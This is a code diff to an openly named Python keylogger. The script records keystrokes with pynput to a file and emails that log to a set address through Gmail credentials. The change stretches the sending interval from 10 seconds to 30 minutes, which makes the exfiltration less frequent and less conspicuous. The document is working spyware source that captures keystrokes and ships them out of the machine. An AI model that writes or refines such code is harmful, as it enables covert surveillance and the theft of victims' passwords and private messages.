@@ -11,6 +11,7 @@ from pynput.keyboard import Listener
 load_dotenv()
 
 LOG_FILE = "keys.txt"
+EMAIL_DELAY = 1800  # delay in seconds
 
 # Email details
 sender_email = os.environ["GMAIL_USER"]
@@ -32,7 +33,6 @@ def send_email():
             msg["Subject"] = "Keylogger Logs"
             msg["From"] = sender_email
             msg["To"] = receiver_email
-            msg.set_content("Attached is the log file.")
 
             # Attach file
             msg.add_attachment(
@@ -46,7 +46,7 @@ def send_email():
         except FileNotFoundError:
             pass
 
-        time.sleep(10)
+        time.sleep(EMAIL_DELAY)
 
 
 def on_press(key):
